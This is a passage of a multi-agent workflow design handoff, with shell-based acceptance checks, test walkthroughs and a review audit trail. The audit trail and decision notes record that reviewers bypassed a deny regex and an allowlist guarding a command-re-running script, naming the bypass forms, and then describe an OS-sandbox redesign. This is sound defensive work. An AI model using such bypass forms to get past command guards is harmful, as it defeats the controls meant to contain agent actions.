.tad/config-quality.yaml .tad/config-execution.yaml .tad/config-agents.yaml .tad/templates/handoff-a-to-b.md .tad/templates/completion-report.md .tad/templates/deliverable-handoff.md .tad/templates/output-formats/spec-compliance-format.md .tad/hooks/pre-gate-check.sh .tad/hooks/pre-accept-check.sh .tad/hooks/lib/layer2-audit.sh .agents/skills/tad/SKILL.md AGENTS.md README.md docs/CODEX-USER-GUIDE.md docs/RALPH-LOOP.md | wc -l
R8a: for g in $CS $CP; do comm -23 <(git show "$B:$g" | command grep -o '\[A[0-9]*\]' | LC_ALL=C sort -u) <(command grep -o '\[A[0-9]*\]' "$g" | LC_ALL=C sort -u); done | wc -l
R8b: y7=$(awk '/^    step_Y7:/,/^    step_Y8:/' $CP); n=0; for t in A005 A007 A088 A089 A095 A037; do printf '%s\n' "$y7" | command grep -qF "[$t]" || n=$((n+1)); done; echo $n
R8c: for g in $GS $AP $CK; do comm -23 <(git show "$B:$g" | command grep -E 'Knowledge|knowledge' | command grep -E 'BLOCKING|blocking|VIOLATION|MANDATORY|must answer' | LC_ALL=C sort -u) <(command grep -E 'Knowledge|knowledge' "$g" | command grep -E 'BLOCKING|blocking|VIOLATION|MANDATORY|must answer' | LC_ALL=C sort -u); done | wc -l
R9a: for g in $GS $CK $AS $AP .agents/skills/alex/references/express-path-protocol.md .agents/skills/alex/references/bug-path-protocol.md .agents/skills/alex/references/learn-path-protocol.md $DM .agents/skills/alex/references/handoff-creation-protocol.md .agents/skills/alex/references/distillation-loop-protocol.md $BS $CS $CP $RQ $RC .tad/config-quality.yaml .tad/templates/handoff-a-to-b.md .tad/templates/completion-report.md; do for tk in '\[A060\]' '\[A078\]' '\[A081\]' '\[A086\]' 'AR-001' 'Express Handoff is NOT Review-Exemption' 'push' 'credentials' 'spending' 'MUST' 'MANDATORY' 'VIOLATION'; do b=$(git show "$B:$g" | command grep -c -- "$tk"); a=$(command grep -c -- "$tk" "$g"); [ "$a" -ge "$b" ] || echo "LOST $tk $g $b>$a"; done; done | wc -l
R9b: bash .tad/hooks/lib/skill-body-verify.sh >/dev/null 2>&1; echo "exit=$?"
R9c: blk(){ awk '/^<!-- anti_rationalization_registry:BEGIN -->$/{f=1;next}/^<!-- anti_rationalization_registry:END -->$/{f=0}f'; }; echo "$(diff <(git show $B:$AS | blk) <(blk < $AS) | wc -l | tr -d ' ') $(blk < $AS | wc -l | tr -d ' ')"
R9d: for y in .tad/config-quality.yaml .tad/config-agents.yaml .tad/config-execution.yaml; do ruby -ryaml -e "YAML.load_file('$y'); print 'OK '"; done; echo
R10: command grep -cE '^### G([1-9]|1[01]) ' $EV/phase3-completion.md
R11: echo "$(command grep -c 'at most 4 questions per block' $CS) $(command grep -c 'discussing or asking for work' $CS) $(command grep -c 'reads it before asking' $RQ) $(command grep -c 'logged as her recommendation' $RQ) $(command grep -c 'escalate to user' .agents/skills/alex/references/bug-path-protocol.md) $(command grep -c 'escalate to Alex' .agents/skills/alex/references/bug-path-protocol.md) $(command grep -c '≥1 expert' .agents/skills/alex/references/learn-path-protocol.md) $(awk '/^### 7\./,/^### 8\./' $RC | command grep -ci 'simple tier') $(command grep -c 'adds security, data or money' $CP) $(command grep -c 'adds security, data or money' $BS) $(command grep -c 'written before the Layer 2 dispatch' $BS)"
R12: m=0; for t in 'What the human gets' 'Not wanted' 'Done check' 'Premise:' '### Decisions for the human' '**Budget**' '**Depth**'; do command grep -qF -- "$t" .tad/templates/epic-template.md || m=$((m+1)); done; echo "$m $(awk '/^### 1\. Intake/,/^### 2\. Dispatch/' $CS | command grep -c 'gate1-format-check.sh') $(command grep -cF -- '- **Done check**' $RQ) $(command grep -cF -- '- **Not wanted**' $RQ) $(awk '/^### 1\.5 Requirement/,/^---$/' .tad/templates/handoff-a-to-b.md | command grep -cF -- '- **Done check**') $(command grep -c 'Done check' $CS)"
R13a: o=$(bash $FX/gate3-sandbox-proof.sh 2>&1); printf '%s\n' "$o" | command grep -cE '^(threat rows: [0-9]+ ran, 0 not-run|outside effects: 0 *|secret in out file: 0|box removed: yes|PROOF PASS)$'
R13b: command grep -cE '^DENY=|GUARD_EOF' $G3S
```

R10 walks (Blake writes each as a heading `### G1 …` … `### G11 …`; each quotes the deciding file:line and reaches the stated end; a walk that does not reach it is a FAIL, not a note):
- G1 direct `/blake`, `risk_triggers: [none]` → Layer 2 = run (+ `gate3-check.sh rerun`) + consistency; an open P1 does not block (carried); no round cap; round 3 with an open P0 → Alex. (Intake said "one run reviewer"; Part 3 G makes it two.)
- G2 Cora run Gate 3, one `real_path` without run evidence → `gate3-check.sh paths` exit 1 `MISSING` → run verdict FAIL (contract §1); a PASS header despite MISSING breaks self-consistency → not returned → one re-dispatch → stop (reason 1). Variant: the path is blocked by unresolved friction → `## Blocked` line → `BLOCKED <ID>` (exit 0) → verdict at most PARTIAL (contract §1, §6) → routed as blocking (§7), never as PASS.
- G3 Gate 4 on a UI change, acceptor subagent without a browser tool → `not-run: no browser tool on <harness>` under `## Not run` and a `Not run:` line in `## For the human` (not `Needs you:`) → verdict at most CONDITIONAL → Cora (step_Y7 3) re-dispatches the acceptor once on a subagent type with a browser when the harness has one, else relays the CONDITIONAL; a browser install is asked, not done.
- G4 Gate 4 needs a paid call → class 3 question → Cora stop reason 3; not run, not skipped.
- G5 Gate 4 item needing the human's own account login → `Needs you:` with that reason; nothing else goes to him.
- G6 Epic without `**Budget**` → `gate1-format-check.sh` MISSING c4 → Cora fills it before the intake dispatch.
- G7 defect reported to Cora after acceptance → she writes the escape-log line (rule table names the gate) before triaging the fix; the next distillation reads it.
- G8 direct `/alex *accept` → Alex dispatches the acceptor (not himself); the human gets the verdict + 3–5 evidence lines; no demo asked.
- G9 direct `*bug` on an accepted result → escape-log line at step2; fix → Gate 3 run + consistency → `*accept` acceptor runs the reported repro.
- G10 Cora simple tier → Gate 1 script on the journal line; Gate 3 run + consistency; no separate Gate 4; Cora relays the run file's `## For the human` with its pointer (D6).
- G11 a phase whose Result contract includes a release → acceptor installs the `git archive` shape into a throwaway project before the tag; the post-tag download install is recorded `not-run: after the tag — run by the release step` and shown as a `Not run:` line (never a `Needs you:` item); the tag is the human's stop-list confirmation (human-rulings.md 2026-10-16).

### AC Dry-Run Log (Alex step1d, 2026-10-19 19:30–19:46, `bash -c` with the ENV line, `command grep`; re-run in full by design fix p3-y4-1)
- p3-y4-1: every raw line re-checked with `bash -n -c "<ENV>; <line>"` (no syntax error) and run on the baseline; outputs equal the Verified Output column (R2a, R2d, R3b, R6b, R7b, R12 are new or changed). Each post-impl expectation was then re-derived against the specified output formats: R3b `ok=2` = `| AC1 | 0 |` + `| AC2/R2 | 0 |` (pattern accepts both row forms; checked on sample lines: notrun/ok patterns count `2 2` on `AC1`, `AC2/R2`, `AC3 not-run`, `AC3/R3b not-run`); R3a needs Blake's `runs_first` line; R4a AP and DM need the key lines now written in §4.2.3; R5 needs the bug-path step2 path; R4b's 14 hits all fall in the replaced Gate 4 ranges; R9a/R8c token-bearing lines are listed in §📚 2; R2a damage 1's BSD sed form was run on a sample (keeps `## Result contract`, deletes the rest).
- Every raw line passed `bash -n -c`; then run as written. Outputs today are the "Verified Output" column: post-impl rows fail for the right reason (absent scripts/fixtures/files → 127 or empty; missing tokens counted).
- Invariants that must hold after: R2c `0`, R6c `3/3 1/1 l2=exit 0 exit 1 exit 2`, R8a–R8c `0`, R9a `0`, R9b `exit=0`, R9c `0 64` (64 = registry lines, guards a vacuous diff), R9d `OK OK OK`.
- R2b expectation derived by reading this Epic: it has `## Requirement` block lines, Q→A log, Assumptions, `What the human gets:`, `Not wanted:`, `**Depth**: … blast radius`, `**Budget**: estimate ~28`, and lacks a Done check block, a `### Decisions for the human` heading and a `Premise:` line → 3 MISSING.
- R7a today `4` (layer2-audit.sh:251, docs/process-tax-cut.md:64, docs/RALPH-LOOP.md:71, patterns/process-tax-cut.md:8). R7b today `37`.
- Fixture-based rows (R2a, R3b, R6e) use `mktemp -d` and leave the repo untouched; R6e's fixture today gives `FAIL … only substitutions: gate3-verdict` (exit 1), i.e. `0 0`.
- verify-ac-commands.sh advisory tail: not run in this dispatch; Blake may run it (advisory).

---

## 9.2 Expert Review Status
Not run in this dispatch (Design kind stops before step2). Y4 reviewers write their files under `.tad/evidence/yolo/review-redesign/` (lenses: consistency + risk covering platform and security).

### Audit Trail
| Reviewer | Issue | Resolution Section | Status |
|---|---|---|---|
| Y4 r1 consistency (`phase3-design-review-cr.md`) | P0-1 rerun row naming vs R3b `ok=2` | §4.2.2, R3b (change log 1; class fixes 2–5) | fixed |
| Y4 r1 consistency | P1-1 Gate 1 carriers | D2, §4.2.1, R2d, R12 | fixed |
| Y4 r1 consistency | P1-2 `paths` vs `## Blocked` | §4.2.2, R3b, G2 | fixed |
| Y4 r1 consistency | P1-3 second copies, R7b tokens | K35–K37, §4.2.7, R7b | fixed |
| Y4 r1 consistency | P1-4 guard labels | §9.1 | fixed |
| Y4 r1 consistency | P1-5 D6 simple tier | §4.1 D6 | carried: human decision at Gate 4 |
| Y4 r1 consistency | P1-6 "Who dispatches" | K19, §4.2.5 | fixed |
| Y4 r1 consistency | P1-7 R2a reason | R2a | fixed |
| Y4 r1 consistency | P1-8 `data` trigger | change log | not applied (reason given) |
| Y4 r1 consistency | P1-9 §6 vs `rerun` | K8, §4.2.2 | fixed |
| Y4 r1 consistency | P1-10 pre-accept-check wording | K38, §4.2.6 | fixed |
| Y4 r1 fit (`phase3-design-review-fit.md`) | P1-1 browser-less UI | duty 4, step_Y7 3, acceptance step3, G3 | fixed (design) |
| Y4 r1 fit | P1-2 MANDATORY vs protocol walk | §4.2.3 | fixed |
| Y4 r1 fit | P1-3 post-tag download owner | duty 5, G11 | fixed (design); release-runbook step = Open P1 |
| Y4 r1 fit | proportion: defer docs first | change log | not applied (AC7 covers docs) |
| Y6 r1 run (`phase3-impl-review-run.md`) | P0-1 deny regex bypassed | re-plan R1–R3 (§4.2.2, AC13, RP6) | re-planned (premise false) |
| Y6 r2 consistency (`phase3-impl-review-cr-r2.md`) | P0-1..3 allowlist bypassed (`sed -ie`, `cd` + script, awk pipe); P1-1 more guard holes; P1-2 proof lacked these forms | re-plan R1–R3 (guard removed; all forms are threat fixtures) | re-planned |
| Y6 r2 run (`phase3-impl-review-run-r2.md`) | P0-1 eight allowlist bypasses (introduced_by_fix); P1-6 `gate1-good.md` untracked | re-plan R1–R4 (the rerun copy includes ignored files, so P1-6 no longer breaks a row; clean-clone re-runnability stays carried with CR r1 P1-1) | re-planned |

### Template check (Alex, this dispatch)
Template sections kept in numbering: frontmatter (task_type, e2e_required, research_required, risk_triggers, real_paths, + dispatch_id), Gate 2 (not claimed), Checklist, §1.1–1.5, §📚, §2.1–2.3, §3.1–3.2, §4 (4.0 added for contradictions, 4.1–4.5), §5 MQ, §6, §7.1–7.3 (Grounded Against), §8 (8.3, 8.4, 8.5), §9, §9.1 (+ Dry-Run Log), §9.2 (Audit Trail), §10, §11. Not used: §3.3 optimization target, §6.1 micro-tasks, §8.1–8.2/8.6 unit/integration test sections (no test suite), §12 sub-agent record (Blake fills if used). Required Evidence Manifest: the completion report, the nine fixtures, the ac-rerun file and gate3 files listed in §6/§7.1.

---

## 10. Important Notes

### 10.1 Critical Warnings
- ⚠️ Edit the canonical checklist before the gate SKILL (SSOT rule at its head); keep the Gate 4 KA line byte-identical.
- ⚠️ `gate3-check.sh` executes text from a file (re-plan p3-y6-replan-1): a row runs **only** inside the sandbox around the box, after the probe passed; never `eval` beyond `bash -c "$cmd"` under `env -i`; never a fallback that runs a row outside the sandbox (no flag, no env var to disable it); never write into the handoff it reads; the box path is script-made and removed by the trap. While building and proving it, Blake runs threat rows only through `gate3-sandbox-proof.sh` against its scratch root — never against this repo, the real HOME or a real remote.
- ⚠️ No hook registration anywhere (R2c); no new `exit 2` in hook scripts (R6c); no `set -e` in the new scripts.
- ⚠️ Do not touch the anti-rationalization registry (byte-exact), principles.md, Lite, NEXT.md, session-state.md, the Epic file, `docs/MULTI-PLATFORM.md`; no version bump; no push.
- ⚠️ This run's own Phase 3 reviews follow the protocol as approved at "continue" (Epic Notes); the new rules apply from the next run.

### 10.2 Known Constraints
- AR-002 [A092]: gate SKILL, Blake SKILL, Cora SKILL, Alex SKILL, acceptance-protocol and config edits > 20 lines → list the changed contracts in the completion report.
- The escape-log live file sits in the gitignored evidence dir: it is checked on disk (R5; the rerun copy includes ignored files), not in the commit; the template ships.
- Linux `bwrap` path cannot be run on this macOS host: RP6 records it `not-run: no Linux host` unless the run reviewer has one; the start-up probe is what makes an unproven host safe (it runs nothing unless the denials are observed).
- Until the Epic ends nothing is released; the release ruling applies to the release that ships this Epic (G11 walks it).

### 10.3 Sub-Agent使用建议
None required; Blake does not call reviewers in this run (Cora dispatches them).

---

## 11. Learning Content

### 11.1 Decision Rationale: who checks the Gate 3 run reviewer's evidence
| 方案 | 优点 | 缺点 | 为什么没选 |
|---|---|---|---|
| Run reviewer writes the verdict; a script checks coverage inside its file; the Gate 4 acceptor re-runs the same script on the final file (chosen) | no extra dispatch; the mechanical check is deterministic; a second party re-checks | the run reviewer still pastes its own script output | ✅ |
| A cheapest-tier subagent routes the script output into a separate Gate 3 verdict | writer fully separate from the runner | +1 dispatch per round; a router judges nothing a script cannot | cost without new judgment |
| Cora runs the script and routes on its exit code | cheapest | Cora would hold a verdict-shaped signal ("gives no verdict") | breaks Cora's rule |

**💡 Human学习点**: separate who *judges* from who *runs*; a deterministic check needs no judge, only a second reader who did not write the evidence.

### 11.1b Decision Rationale: how `rerun` stays harmless (re-plan p3-y6-replan-1)
| 方案 | 优点 | 缺点 | 为什么没选 |
|---|---|---|---|
| Text filter (deny regex, then allowlist) before running in the real repo | no setup | the text is not what bash runs; two rounds, 14+ bypasses found by observation | premise false (premise file) |
| Script never executes; it only extracts the commands and the reviewer runs them by hand | zero script risk | drops "acceptance commands are re-run by script" (Epic Part 2 Gate 3) | changes the Requirement |
| Run in a disposable copy only (clone, no remote, env cleared) | simple | absolute paths, symlinks and network still reach the real machine | copy alone is no barrier |
| OS sandbox around a disposable copy, probed before use; none → not-run (chosen) | the barrier is the kernel, not a parser; keeps the scripted re-run; every threat class is a fixture proven harmless by observation | macOS `sandbox-exec` (deprecated but shipped) / Linux `bwrap` needed; a nested harness sandbox can refuse it → rows not-run | ✅ |

**💡 Human学习点**: when a filter keeps leaking under independent testing, stop patching the filter and ask what it assumes; here the fix was to move the barrier from "what the command says" to "what the process is allowed to touch".

### 11.2 Decision Summary
- D6 simple tier without a separate Gate 4 (assumption for Gate 4 to list to the human).
- Browser missing = `not-run` (capability), not friction; install = asked dependency (contract §6 changed accordingly); shown to the human as `Not run:`, never asked; caps a UI deliverable at CONDITIONAL; one re-dispatch on a browser-capable subagent first (p3-y4-1).
- Post-tag download install: owned by the release step, never the human (p3-y4-1); the release-runbook step itself is outside this phase (Open P1).
- Gate 3 re-run safety comes from the environment, not from reading commands (p3-y6-replan-1, premise file `phase3-premise.md`): sandboxed disposable copy; no sandbox → rows not-run and run by hand (assumption for Gate 4 to list).

---

**Handoff Created By**: Alex (Agent A), conductor dispatch p3-y3-1; design fix p3-y4-1; re-plan p3-y6-replan-1
**Date**: 2026-10-19
**Version**: 4.0.3
